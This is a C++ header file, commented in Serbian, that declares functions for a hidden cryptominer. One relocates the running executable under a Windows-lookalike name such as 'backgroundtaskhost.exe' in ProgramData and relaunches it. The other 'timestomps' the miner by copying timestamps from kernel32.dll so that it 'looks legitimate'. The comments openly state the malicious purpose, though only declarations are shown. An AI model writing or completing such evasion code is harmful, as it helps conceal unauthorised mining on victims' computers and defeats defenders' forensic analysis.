#pragma once

namespace ProcessSpoofer {

    /**
     * @brief Kopiira trenutni izvršni fajl na novu lokaciju sa novim imenom,
     *        pokreće ga i gasi originalni proces.
     * @param newName Ime novog procesa (npr. "backgroundtaskhost.exe").
     * @param newPath Puna putanja do foldera gde će se fajl smestiti (npr. "C:\\ProgramData\\Microsoft\\").
     * @return Vraća true ako je novi proces uspešno pokrenut, inače false.
     */
    bool SpoofProcess(const char* newName, const char* newPath);

    /**
     * @brief Kopiira vremenske oznake (creation, last access, last write) sa
     *        sistemskog fajla na naš fajl da bi izgledao legitimno.
     * @param targetFile Fajl čije vremenske oznake menjamo (naš miner).
     * @param sourceFile Fajl sa koga kopiramo oznake (npr. "C:\\Windows\\System32\\kernel32.dll").
     * @return Vraća true ako je operacija uspela, inače false.
     */
    bool TimeStampStomp(const char* targetFile, const char* sourceFile);

}